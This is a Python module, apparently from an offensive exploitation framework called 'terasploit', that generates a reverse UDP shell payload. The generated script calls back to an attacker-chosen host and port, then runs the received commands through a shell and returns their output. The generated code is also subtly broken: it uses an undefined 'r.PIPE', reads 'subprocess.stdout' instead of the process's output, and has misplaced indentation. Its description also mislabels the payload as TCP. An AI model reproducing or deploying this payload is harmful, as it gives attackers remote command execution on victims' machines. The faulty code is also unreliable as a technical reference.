#######
# Module/Payload: Reverse UDP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):
    
    module_type = 'payload'
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'payload',
                'Name' : 'reverse udp shell python',
                'Author' : 'Handler4',
                'Type' : 'reverse_udp',
                'Arch' : 'python',
            
                'Description' : [
                    'python reverse tcp shell for linux platform'
                ],
            
                'Platform' : [
                    'Python'
                ]
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptIP.new("lhost",[
                "","yes","target listening address"
            ]),
            OptPort.new("lport",[
                4444,"yes","target listening port"
            ])
        ])


    def run(self) -> tuple[str, bool]: 
        payload_content = self.shell_content()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['Type']
        info_print (f'Generating {shell_name}...')
        self.generate_file(shell_name,payload_arch,payload_content)
        info_print ('Shell generated!')
        info_print(f'Saved as {shell_name}.py')
        return 'done', True


    def shell_content(self) -> str:
        lhost = Opt('payload').GetOPT('lhost')
        lport = Opt('payload').GetOPT('lport')
        
        code: str = (
            'import socket' + '\n' +
            'import subprocess' + '\n' +
            'sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)' + '\n' +
            "out = b''" + '\n' +
            'while True:' + '\n' +
      	   f"   sock.sendto(out,('{lhost}',{lport}))" + '\n' +
      	    '   d = sock.recv(1024)' + '\n' +
      	    '   if len(d)==0:' + '\n' +
      		'       break' + '\n' + 
      	    "p = subprocess.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)" + '\n' +
      	    "out = subprocess.stdout.read()+p.stderr.read()"
        )
        
        return code